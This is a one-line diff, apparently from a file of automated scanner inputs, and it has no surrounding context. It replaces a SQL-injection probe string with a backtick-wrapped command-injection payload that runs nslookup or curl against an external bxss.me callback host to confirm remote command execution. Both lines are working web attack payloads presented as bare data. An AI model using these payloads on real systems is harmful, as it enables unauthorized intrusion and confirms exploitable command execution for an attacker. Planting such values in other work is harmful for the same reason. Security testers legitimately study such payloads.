@@ -1,1 +1,1 @@
--1" OR 2+223-223-1=0+0+0+1 -- 
+`(nslookup -q=cname hitishjijtydd8f484.bxss.me||curl hitishjijtydd8f484.bxss.me)`
